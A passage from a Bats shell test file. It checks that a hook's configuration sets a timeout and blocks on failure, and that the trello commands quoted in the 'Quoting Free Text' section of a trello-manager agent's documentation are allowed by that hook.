  grep -Eq '^[[:space:]]*timeout:[[:space:]]*10[[:space:]]*$' <<< "$block"
  grep -Eq '^[[:space:]]*onFailure:[[:space:]]*block[[:space:]]*$' <<< "$block"
}

@test "78: the trello commands in the agent's Quoting Free Text example are allowed by the hook" {
  local agent examples line n=0
  agent="${BATS_TEST_DIRNAME}/../../agents/trello-manager.md"
  [ -f "$agent" ]
  # Lines starting with "trello " inside the bash fence of that section.
  examples="$(awk '/^### Quoting Free Text/ {s=1; next} s && /^#{1,3} / {exit}
                   s && /^```bash/ {b=1; next} s && /^```/ {b=0}
                   s && b && /^trello / {print}' "$agent")"
  [ -n "$examples" ]
  while IFS= read -r line; do
    n=$((n + 1))
    run_as_trello_manager "$line"
    assert_silent
  done <<< "$examples"
  [ "$n" -ge 1 ]
}
